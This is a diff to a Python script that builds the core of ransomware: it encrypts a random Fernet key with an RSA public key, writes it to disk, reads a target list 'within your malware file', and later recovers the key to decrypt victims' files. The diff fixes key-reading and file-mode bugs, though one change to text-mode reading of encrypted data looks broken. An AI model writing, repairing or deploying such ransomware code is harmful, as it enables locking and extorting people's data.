@@ -6,15 +6,16 @@ from cryptography.fernet import Fernet
 def BooeyEncryption():
 
     # Given a public key (this can be created outside of the scenario)
-    with open('bababooey.pub', 'rb') as publicKey:
-
+    with open('bababooey.pub', 'rb') as f:
+        publicKey = f.read()
+        
         # Create a Random Symmetric Key in Memory (smem)
         smem = Fernet.generate_key()
 
         # Create an encrypted variant of smem on disk (smem-enc)
         smem_enc = rsa.encrypt(smem, publicKey)
 
-        with open('smem-enc', 'w') as f:
+        with open('smem-enc', 'wb') as f:
             f.write(smem_enc)
 
         # Either within your malware file or perhaps a configuration file, read a target list
@@ -52,15 +53,15 @@ def BooeyEncryption():
 def BooeyDecryption():
 
     # Read the RSA private key from disk
-    with open('bababooey.pem', 'r') as f:
+    with open('bababooey.pem', 'rb') as f:
         privateKey = f.read()
 
     # Read the encrypted symmetric key from disk
-    with open('smem-enc', 'r') as f:
+    with open('smem-enc', 'rb') as f:
         smem_enc = f.read()
 
     # Decrypt the symmetric key
-    smem = rsa.decrypt(smem_enc.encode(), privateKey)
+    smem = rsa.decrypt(smem_enc, privateKey)
 
     # Read the list of encrypted files from a directory
     encryptedFilesDir = input('Path to encrypted files:')
@@ -73,7 +74,7 @@ def BooeyDecryption():
             decryptedFilePath = os.path.join(encryptedFilesDir, encryptedFileName[:-4]) # remove the '_enc' extension
             
             # Read the encrypted file contents
-            with open(encryptedFilePath, 'rb') as f:
+            with open(encryptedFilePath, 'r') as f:
                 encryptedData = f.read()
             
             # Decrypt the file contents
